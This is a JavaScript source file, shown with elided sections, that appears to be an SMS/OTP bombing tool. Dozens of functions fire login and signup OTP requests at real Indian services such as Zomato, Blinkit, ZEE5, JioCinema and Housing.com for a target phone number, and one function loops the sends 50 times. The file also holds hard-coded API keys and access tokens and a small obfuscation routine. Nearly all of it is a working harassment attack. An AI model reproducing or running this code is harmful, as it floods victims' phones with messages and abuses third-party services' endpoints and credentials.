function hash(data) {
  var password = String.fromCharCode(
    109,
    121,
    119,
    97,
  ...
  for (let i = 0; i < data.length; i++) {
    const charCode =
      String(data[i]).charCodeAt(0) ^ password.charCodeAt(i % password.length);
...
export async function systemui(number, durationHours = 72) {
...
export async function buggc(number) {
  for (let i = 0; i < 50; i++) {
    await mywallety(number)
    await housing(number)
  }
}

export async function mywallety(number) {
...
export async function my11circle(number) {
  return new Promise((resolve) => {
    fetch("https://www.my11circle.com/api/fl/auth/v3/getOtp", {
      ...
      .then((data) => {
        if (data?.success === true) resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function housing(number) {
  return new Promise((resolve) => {
    fetch(
      "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_rent_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb",
      {
        method: "POST",
        headers: {
          "User-Agent":
      ...
      .then((data) => {
        if (data?.data?.sendOtp.success === true) resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function zomato(number) {
  return new Promise((resolve) => {
    ...
    fetch("https://accounts.zomato.com/login/phone", {
      ...
      .then((data) => {
        if (
          data?.status === true &&
          data?.message === "Check text messages for your OTP"
        )
          resolve(true);
        resolve(false);
      })
...
export async function fantv(number) {
  return new Promise((resolve) => {
    fetch("https://admin.artistfirst.in/v1/auth/login-signup", {
      ...
      .then((data) => {
        if (data?.message === "success") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function byjus(number) {
  return new Promise((resolve) => {
...
export async function netmeds(number) {
  return new Promise((resolve) => {
    fetch("https://www.netmeds.com/mst/rest/v1/id/details/" + number)
      .then((res) => {
        let contenttype = res.headers.get("content-type");
        if (contenttype && contenttype.includes("application/json") === true) {
          return res.json();
      ...
      .then((data) => {
        if (data?.result?.otp_details?.random_key) resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function unacademy(number) {
  return new Promise((resolve) => {
...
export async function medibuddy(number) {
  return new Promise((resolve) => {
    fetch("https://loginprod.medibuddy.in/unified-login/user/register", {
      ...
      .then((data) => {
        if (data?.data?.OtpStatus === "Sent") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function momsco(number) {
  return new Promise((resolve) => {
    fetch(
      "https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a",
      {
        method: "POST",
        headers: {
          "User-Agent":
      ...
      .then((data) => {
        if (data?.message === "Successfully Generated OTP") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function ajio(number) {
  return new Promise((resolve) => {
      ...
      .then((data) => {
        if (data?.success === true) resolve(true);
          ...
          fetch("https://login.web.ajio.com/api/auth/signupSendOTP", {
            ...
            .then((data) => {
              if (data?.statusCode === "1") resolve(true);
              resolve(false);
            })
            .catch((err) => {
...
export async function nxtwave(number) {
  return new Promise((resolve) => {
    fetch(
      "https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/login/phone_number/v1/",
      {
        method: "POST",
        headers: {
          "User-Agent":
      ...
      .then((data) => {
        if (data?.user_id) {
          ...
          fetch(
            "https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/create_with_phone_number/v1/",
            {
              method: "POST",
              headers: {
                "User-Agent":
            ...
            .then((res) => res.json())
            .then((data) => {
              if (data.user_id) resolve(true);
              else {
                fetch(
                  "https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/send_otp_to_user_with_phone_number/v1/",
                  {
                    method: "POST",
                    headers: {
                      "User-Agent":
...
export async function tradex(number) {
  return new Promise((resolve) => {
...
export async function kukufm(number) {
  return new Promise((resolve) => {
    fetch("https://kukufm.com/api/v1/users/auth/send-otp/", {
      ...
      .then((data) => {
        if (data?.message === "OTP sent successfully") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function blinkit(number) {
  return new Promise((resolve) => {
    fetch("https://blinkit.com/v2/accounts/", {
      ...
      .then((data) => {
        if (data?.sms_sent === true) resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function probo(number) {
  return new Promise((resolve) => {
    fetch("https://prod.api.probo.in/api/v1/user/login", {
      ...
      .then((data) => {
        if (data?.message === "Successfully Done!!") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function eatclub(number) {
  return new Promise(async (resolve) => {
    let res = await fetch(
      "https://accounts.box8.co.in/device/register?brand_id=19&device_id=" +
        hoichoirandom() +
        "twj-xpo7-1fv8-nb1w-" +
        hoichoirandom() +
        "sh2kvzz&platform=web&device_token=null&token=&origin=eatClub"
    );
    let data = await res.json();
    let authorization = data.unsigned_auth_token;
    fetch(
      "https://accounts.box8.co.in/customers/sign_up?origin=eatClub&platform=web",
      {
        method: "POST",
        headers: {
          "User-Agent":
      ...
      .then((data) => {
        if (data?.meta.status === "Not OK") {
          fetch(
            "https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web",
            {
              method: "POST",
              headers: {
                "User-Agent":
            ...
            .then((data) => {
              if (data?.meta.status === "OK") resolve(true);
              resolve(false);
            });
        } else resolve(true);
      })
...
export async function hoichoi(number) {
  return new Promise((resolve) => {
    fetch(
      "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-" +
        hoichoirandom() +
        "b43-1ea6-02dd-860c-" +
        hoichoirandom() +
        "bfc5b1f",
      ...
      .then((data) => {
        if (data?.error) {
          fetch(
            "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-" +
              hoichoirandom() +
              "-a627-f106-af27-2b7" +
              hoichoirandom() +
              "5d82",
            ...
            .then((data) => {
              if (data?.sent === "true") resolve(true);
              resolve(false);
            });
        } else resolve(true);
      })
...
export async function jiocinema(number) {
  return new Promise((resolve) => {
    fetch("https://auth-jiocinema.voot.com/userservice/apis/v4/loginotp/send", {
      ...
      headers: {
        ...
        "Content-Type": "application/json",
        accesstoken:
          "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9..CVWts8Wrwf4rg4PyHYVUCC_h1xkZXT-MN-SwNWaAnyTZezttWbNVhKSUsQ9zy89O79_8DmIiVSyXEyl6ULa_HQ",
...
export async function fancode(number) {
  return new Promise((resolve) => {
...
export async function gamezone(number) {
  return new Promise((resolve) => {
    fetch(
      "https://api.dotshowroom.in/api/dotk/vo1/user/login/" +
        number +
        "?source=digital_showroom&domain=https://www.digitalgamezone.co.in/orders"
    )
      .then((res) => {
        let contenttype = res.headers.get("content-type");
        if (contenttype && contenttype.includes("application/json") === true) {
...
export async function zee5(number) {
  return new Promise((resolve) => {
    let deviceid = zee5getrandom(36);
    let token = btoa(
      deviceid + "__gBQaZLiNdGN9UsCKZaloghz9t9StWLSD__" + Date.now()
    );
    fetch("https://auth.zee5.com/v1/user/sendotp", {
      ...
      .then((data) => {
        if (data?.message === "SMS successfully sent") resolve(true);
        resolve(false);
      })
      .catch((err) => {
...
export async function mamaearth(number) {
  return new Promise((resolve) => {
...
export async function derma(number) {
  return new Promise((resolve) => {
